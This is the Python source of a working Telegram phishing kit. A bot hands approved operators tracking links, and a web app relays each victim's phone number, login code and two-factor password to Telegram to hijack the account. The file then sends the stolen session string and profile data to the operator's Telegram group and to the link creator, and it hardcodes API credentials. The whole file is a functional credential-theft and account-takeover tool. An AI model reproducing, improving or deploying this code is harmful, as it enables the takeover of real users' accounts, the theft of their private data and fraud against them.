import os
import asyncio
import telebot
import qrcode
import base64
import psycopg2
from io import BytesIO
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession
from threading import Thread
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
BASE_URL = os.environ.get("BASE_URL", "https://your-app.koyeb.app")
OWNER_ID = 6092011859  # Your ID (VinzyOwner)

try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Memory storage for active login sessions
active_relays = {}

# --- DATABASE LOGIC (Neon.com) ---

def init_db():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS authorized_users (user_id TEXT PRIMARY KEY)")
    conn.commit()
    cur.close()
    conn.close()

def is_authorized(user_id):
    if int(user_id) == OWNER_ID: return True
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM authorized_users WHERE user_id = %s", (str(user_id),))
    result = cur.fetchone()
    cur.close()
    conn.close()
    return result is not None

init_db()

# --- UTILITY: DATA SCRAPING ---

async def scrape_full_data(client, phone):
    try:
        me = await client.get_me()
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        session_str = client.session.save()
        
        return {
            "name": f"{me.first_name} {me.last_name or ''}".strip(),
            "id": me.id,
            "username": f"@{me.username}" if me.username else "None",
            "bio": full_user.full_user.about or "No Bio",
            "premium": "✅ Yes" if me.premium else "❌ No",
            "session": session_str,
            "phone": phone
        }
    except Exception as e:
        print(f"Scraping failed: {e}")
        return None

# --- BOT COMMANDS & CALLBACKS (KHMER) ---

@bot.message_handler(commands=['start'])
def handle_start(m):
    user_id = m.from_user.id
    if is_authorized(user_id):
        msg = (
            "👑 <b>VinzyStore Relay System (Active)</b>\n"
            "━━━━━━━━━━━━━━━\n"
            "👋 សួស្តី! អ្នកមានសិទ្ធិប្រើប្រាស់ប្រព័ន្ធនេះរួចហើយ។\n\n"
            "<b>បញ្ជា (Commands):</b>\n"
            "• <code>.link [label]</code> - បង្កើតតំណភ្ជាប់ថ្មី\n"
            "• <code>.list</code> - មើលបញ្ជីលេខដែលចាប់បាន\n"
            "• <code>.id</code> - មើល ID របស់អ្នក"
        )
        bot.send_message(m.chat.id, msg, parse_mode="HTML")
    else:
        # Request access from Owner in the Group
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ អនុញ្ញាត (Approve)", callback_data=f"auth_{user_id}"),
            InlineKeyboardButton("❌ បដិសេធ (Decline)", callback_data=f"decline_{user_id}")
        )
        
        request_to_admin = (
            "🔔 <b>ការស្នើសុំសិទ្ធិថ្មី</b>\n"
            "━━━━━━━━━━━━━━━\n"
            f"👤 ឈ្មោះ: {m.from_user.first_name}\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            "━━━━━━━━━━━━━━━\n"
            "⚠️ មានតែ @VinzyOwner ម្នាក់គត់ដែលអាចចុចបាន។"
        )
        bot.send_message(GROUP_ID, request_to_admin, reply_markup=markup, parse_mode="HTML")
        bot.send_message(m.chat.id, "⏳ <b>សំណើរបស់អ្នកត្រូវបានផ្ញើទៅកាន់ម្ចាស់ប្រព័ន្ធហើយ។</b>\nសូមរង់ចាំការអនុញ្ញាត។")

@bot.callback_query_handler(func=lambda call: True)
def handle_approval(call):
    # SECURITY: Only OWNER_ID can approve
    if call.from_user.id != OWNER_ID:
        bot.answer_callback_query(call.id, "❌ អ្នកមិនមែនជាម្ចាស់ប្រព័ន្ធទេ!", show_alert=True)
        return

    action, target_id = call.data.split("_")
    
    if action == "auth":
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("INSERT INTO authorized_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (target_id,))
        conn.commit()
        cur.close()
        conn.close()
        
        bot.edit_message_text(f"✅ បានអនុញ្ញាត ID: <code>{target_id}</code> រួចរាល់!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        bot.send_message(target_id, "🎉 <b>ការស្នើសុំរបស់អ្នកត្រូវបានអនុញ្ញាត!</b>\nឥឡូវនេះអ្នកអាចប្រើប្រាស់ <code>.link</code> បានហើយ។", parse_mode="HTML")
    
    elif action == "decline":
        bot.edit_message_text(f"❌ បានបដិសេធ ID: <code>{target_id}</code>", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.text.startswith('.link'))
def create_link(m):
    if not is_authorized(m.from_user.id): return
    label = m.text.split(' ')[1] if len(m.text.split(' ')) > 1 else "default"
    relay_url = f"{BASE_URL.rstrip('/')}/?id={m.from_user.id}&tag={label}"
    
    msg = (
        "🔗 <b>តំណភ្ជាប់ថ្មី (Relay Link)</b>\n"
        "━━━━━━━━━━━━━━━\n"
        f"🌐 URL: <code>{relay_url}</code>\n"
        f"🏷️ Tag: <code>{label}</code>\n"
        "━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.id')
def get_id(m):
    bot.reply_to(m, f"🆔 ID របស់អ្នកគឺ: <code>{m.from_user.id}</code>")

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('id')
    # Block access if TID is not authorized
    if not tid or not is_authorized(tid):
        return "❌ <b>Access Denied.</b> Contact @VinzyOwner for permissions.", 403
    return await render_template('login.html', tid=tid)

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        
        # Log entry to both the User's Log (tid) and your Master Group
        log = f"🎯 <b>លេខទូរស័ព្ទថ្មី:</b>\n<code>{phone}</code>\n👤 បញ្ជូនដោយ ID: <code>{tid}</code>"
        bot.send_message(GROUP_ID, log, parse_mode="HTML")
        if tid != str(GROUP_ID): 
            try: bot.send_message(tid, log, parse_mode="HTML")
            except: pass
            
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
    
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(phone, code, phone_code_hash=active_relays[phone]["hash"])
        user_data = await scrape_full_data(client, phone)
        
        if user_data:
            log = (
                f"💰 <b>LOGIN SUCCESS!</b>\n"
                f"👤 ឈ្មោះ: {user_data['name']}\n"
                f"📱 លេខ: <code>{phone}</code>\n"
                f"🔑 Session: <code>{user_data['session']}</code>"
            )
            bot.send_message(GROUP_ID, log, parse_mode="HTML")
            if tid != str(GROUP_ID):
                try: bot.send_message(tid, log, parse_mode="HTML")
                except: pass
        
        return jsonify({"status": "success"})
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
    
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(password=password)
        user_data = await scrape_full_data(client, phone)
        
        if user_data:
            log = f"🔓 <b>2FA BYPASS SUCCESS!</b>\n👤 {user_data['name']}\n🔑 <code>{user_data['session']}</code>"
            bot.send_message(GROUP_ID, log, parse_mode="HTML")
            if tid != str(GROUP_ID):
                try: bot.send_message(tid, log, parse_mode="HTML")
                except: pass
                
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- RUNNER ---

def run_bot():
    print(f"Bot started. Admin: {OWNER_ID}")
    bot.infinity_polling()

if __name__ == "__main__":
    Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=8000)
